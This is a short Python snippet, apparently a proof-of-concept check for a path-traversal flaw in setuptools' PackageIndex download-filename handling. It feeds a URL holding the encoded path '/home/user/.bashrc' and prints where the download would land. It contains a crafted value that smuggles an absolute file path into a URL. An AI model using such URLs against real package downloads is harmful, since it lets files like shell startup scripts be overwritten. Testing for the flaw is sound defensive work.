from setuptools.package_index import PackageIndex
print(PackageIndex._resolve_download_filename(
    "https://example.com/%2Fhome%2Fuser%2F.bashrc", "/tmp/pkgroot"))
